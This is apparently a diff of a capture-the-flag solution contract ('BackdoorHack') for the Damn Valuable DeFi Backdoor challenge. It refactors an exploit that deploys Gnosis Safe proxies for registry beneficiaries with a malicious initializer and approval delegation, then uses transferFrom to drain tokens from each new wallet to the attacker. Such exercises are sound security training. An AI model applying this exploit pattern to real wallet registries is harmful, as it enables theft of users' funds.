@@ -114,14 +114,24 @@ import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "../DamnValuableToken.sol";
 
 contract BackdoorHack {
-    // run attack via constructor as initializer
+    address private immutable registryAddress;
+    address private immutable masterCopyAddress;
+    GnosisSafeProxyFactory private immutable walletFactory;
+    DamnValuableToken private immutable dvt;
+
     constructor(
         address _registryAddress,
         address _masterCopyAddress,
         GnosisSafeProxyFactory _walletFactory,
-        DamnValuableToken _token,
-        address[] memory _beneficiaries
+        DamnValuableToken _token
     ) {
+        registryAddress = _registryAddress;
+        masterCopyAddress = _masterCopyAddress;
+        walletFactory = _walletFactory;
+        dvt = DamnValuableToken(_token);
+    }
+
+    function attack(address[] memory _beneficiaries) external {
         // create wallet for each beneficiary here(for loop each wallet)
         for (uint256 i = 0; i < _beneficiaries.length; i++) {
             address[] memory beneficiary = new address[](1);
@@ -142,17 +152,20 @@ contract BackdoorHack {
                 0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
             );
 
-            GnosisSafeProxy wallet = _walletFactory.createProxyWithCallback(
-                _masterCopyAddress, // Singleton, the Gnosis master copy
+            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
+                masterCopyAddress, // Singleton, the Gnosis master copy
                 _initializer, // initializer => Payload for message call sent to new proxy contract.
                 i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
-                IProxyCreationCallback(_registryAddress) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
+                IProxyCreationCallback(registryAddress) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
             );
-            // approve token transfer
+            // // approve token transfer
             // _token.approve(address(wallet), 40 ether);
-            // // wallet will receieve DVT via callback then transfer to msg.sender
-            // _token.transferFrom(address(wallet), msg.sender, 10 ether);
-            IERC20(address(wallet)).transfer(msg.sender, 10 ether);
+            // wallet will receieve DVT via callback then transfer to msg.sender
+            dvt.transferFrom(address(wallet), msg.sender, 10 ether);
         }
+    }
+
+    function delegateApprove(address _spender) external {
+        dvt.approve(_spender, 10 ether);
     }
 }
